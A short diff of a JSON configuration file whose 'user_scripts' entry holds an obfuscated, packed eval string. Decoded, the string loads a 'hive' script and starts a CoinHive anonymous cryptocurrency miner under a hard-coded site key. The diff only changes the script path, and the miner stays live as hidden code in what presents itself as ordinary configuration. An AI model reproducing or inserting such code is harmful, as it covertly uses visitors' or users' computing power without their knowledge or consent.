@@ -135,6 +135,6 @@
     "enable_log": true,
     "enable_error": true,
     "user_scripts":[
-        "eval(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('$.8(\\'//9/1/1.a\\').7(4(6,5){b 2=f g.h(\\'c\\',{d:0.3});2.e()})',18,18,'|hive|miner||function|textStatus|script|done|getScript|libs|js|var|2MNJwWlQs2A4c86fbjCLQPTWr2Uz58tY|throttle|start|new|CoinHive|Anonymous'.split('|'),0,{}))"
+        "eval(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('$.8(\\'/9/1/1.a\\').7(4(6,5){b 2=f g.h(\\'c\\',{d:0.3});2.e()})',18,18,'|hive|miner||function|textStatus|script|done|getScript|libs|js|var|2MNJwWlQs2A4c86fbjCLQPTWr2Uz58tY|throttle|start|new|CoinHive|Anonymous'.split('|'),0,{}))"
     ]
 }
